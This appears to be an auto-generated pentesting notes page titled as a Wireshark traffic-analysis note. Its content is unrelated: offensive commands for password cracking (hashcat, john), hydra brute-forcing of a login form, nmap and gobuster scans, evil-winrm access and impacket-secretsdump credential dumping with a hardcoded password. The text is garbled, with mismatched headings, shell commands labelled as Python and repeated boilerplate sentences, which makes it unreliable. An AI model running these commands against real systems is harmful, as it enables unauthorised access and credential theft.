---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "oscp, persistence, linux"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-427.html"
URL_IMAGES: ""
Date: "2024-07-17"
Tags: "OSCP, Persistence, Linux"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-427"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-427.html"
BtnLabel: "Read Notes"
Pick: 0
---
## hydra

### DNS

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.37.112 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p23,464,5986 10.57.6.129 -oN scan.txt
nmap -sCV -p25,389,445 10.85.81.103 -oN scan.txt
```

## ldapsearch

### Constrained Delegation

```python
nmap -sCV -p993,80,21 10.93.213.254 -oN scan.txt
gobuster dir -u http://10.76.173.133/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.20.206.109 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

- `secretsdump`
- `Subdomain Takeover`
- `IDOR`
- `Command Injection`
- `bloodhound`

## DNS Rebinding

### Node.js

- `dcomexec`
- `LAPS Abuse`
- `hashcat`
- `lookupsid`
- `smbclient`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.240.208
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.139.198
```

- `Remote File Inclusion`
- `john`
- `secretsdump`

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.
